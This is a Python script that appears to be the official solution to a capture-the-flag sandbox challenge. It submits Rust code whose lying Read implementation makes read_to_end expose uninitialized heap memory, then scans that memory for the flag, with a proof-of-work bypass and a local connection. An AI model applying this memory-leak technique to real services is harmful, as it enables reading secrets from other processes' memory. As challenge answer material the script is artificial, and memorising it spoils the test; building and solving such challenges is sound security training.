#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import pwnlib

soln = """
    use prelude::{Vec, Read, IoResult, log, str, Service, Box};
    struct Liar {
        first: bool,
    }
    impl Liar {
        pub fn new() -> Self {
            Liar {first: false}
        }
    }
    impl Read for Liar {
        fn read(&mut self, _buf: &mut [u8]) -> IoResult<usize> {
            if !self.first {
                self.first = true;
                Ok(4096 * 10)
            } else {
                Ok(0)
            }
        }
    }
    // We will panic before we actually get control back, so we need to hook drop to observe the
    // bad vec
    struct VecWrapper(Vec<u8>);
    impl VecWrapper {
        pub fn new() -> Self {
            let mut v = Vec::new();
            // Make the vector big enough that reading won't re-allocate it
            v.reserve(4096);
            Self(v)
        }
    }
    impl Drop for VecWrapper {
        fn drop(&mut self) {
            for i in 0..self.0.len() {
                if self.0[i..].starts_with(b"CTF") {
                    log!("{:?}", str::from_utf8(&self.0[i..i+44]).unwrap());
                    return;
                }
            }
            log!("Flag not found :(");
        }
    }
    pub struct State(VecWrapper);
    impl State {
        pub fn new() -> Box<dyn Service> {
            Box::new(State(VecWrapper::new()))
        }
    }
    impl Service for State {
        fn handle(&mut self, _: &str) {
            let mut liar = Liar::new();
            liar.read_to_end(&mut self.0.0).unwrap();
        }
    }
EOF
"""

def handle_pow(r):
    print(r.recvuntil(b'python3 '))
    print(r.recvuntil(b' solve '))
    challenge = r.recvline().decode('ascii').strip()
    p = pwnlib.tubes.process.process(['kctf_bypass_pow', challenge])
    solution = p.readall().strip()
    r.sendline(solution)
    print(r.recvuntil(b'Correct\n'))

r = pwnlib.tubes.remote.remote('127.0.0.1', 1337)
print(r.recvuntil('== proof-of-work: '))
if r.recvline().startswith(b'enabled'):
    handle_pow(r)

print(r.recvuntil('(EOF to finish):'))
r.send(soln)
print(r.recvuntil(b'CTF{', timeout=300))

exit(0)
